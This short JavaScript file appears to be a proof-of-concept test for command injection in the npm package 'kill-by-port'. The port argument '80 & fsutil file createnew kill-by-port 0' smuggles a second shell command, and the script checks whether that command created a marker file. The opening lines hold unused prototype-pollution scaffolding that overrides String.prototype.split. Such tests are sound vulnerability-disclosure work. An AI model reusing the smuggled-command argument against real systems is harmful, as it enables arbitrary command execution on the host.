var arg1 = ['constructor'];
var arg2 = ['prototype'];
var flag1 = true;
var flag2 = true;
arg1.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return 'constructor';
    }
};
arg2.toString = function () {
    if (flag2) {
        flag2 = false;
        return 'foo';
    } else {
        return 'prototype';
    }
};
String.prototype.split = function () {
    return [
        arg1,
        arg2,
        'polluted'
    ];
};
const kill_by_port = require('kill-by-port');
const fs = require('fs');
const path = './kill-by-port';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
let file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
kill_by_port.killByPort(`80 & fsutil file createnew kill-by-port 0`);
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlink(path, () => {
});